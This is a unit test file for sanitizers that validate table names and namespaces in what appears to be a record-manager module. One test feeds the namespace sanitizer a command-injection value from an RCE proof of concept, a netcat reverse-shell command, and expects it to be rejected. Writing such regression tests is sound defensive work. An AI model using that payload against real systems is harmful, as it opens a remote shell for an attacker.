import {
    RECORD_MANAGER_TABLE_NAME_MAX_LENGTH,
    sanitizeRecordManagerNamespace,
    sanitizeRecordManagerTableName
} from './recordManagerSecurity'

describe('sanitizeRecordManagerTableName', () => {
    it('accepts valid table names', () => {
        expect(sanitizeRecordManagerTableName('upsertion_records')).toBe('upsertion_records')
    })

    it('normalizes whitespace to underscores', () => {
        expect(sanitizeRecordManagerTableName('  My Table  ')).toBe('my_table')
    })

    it('rejects invalid characters', () => {
        expect(() => sanitizeRecordManagerTableName('table-name')).toThrow('Invalid table name')
    })

    it('rejects names exceeding max length', () => {
        const longName = 'a'.repeat(RECORD_MANAGER_TABLE_NAME_MAX_LENGTH + 1)
        expect(() => sanitizeRecordManagerTableName(longName)).toThrow(/must be at most/)
    })
})

describe('sanitizeRecordManagerNamespace', () => {
    it('accepts UUID-shaped namespaces', () => {
        expect(sanitizeRecordManagerNamespace('a1b2c3d4-e5f6-4789-a012-3456789abcde')).toBe('a1b2c3d4-e5f6-4789-a012-3456789abcde')
    })

    it('rejects shell metacharacters used in RCE PoC', () => {
        expect(() => sanitizeRecordManagerNamespace("'$(/usr/bin/nc 172.17.0.1 1337 -e /bin/sh)")).toThrow('Invalid namespace')
    })

    it('rejects spaces', () => {
        expect(() => sanitizeRecordManagerNamespace('my namespace')).toThrow('Invalid namespace')
    })
})
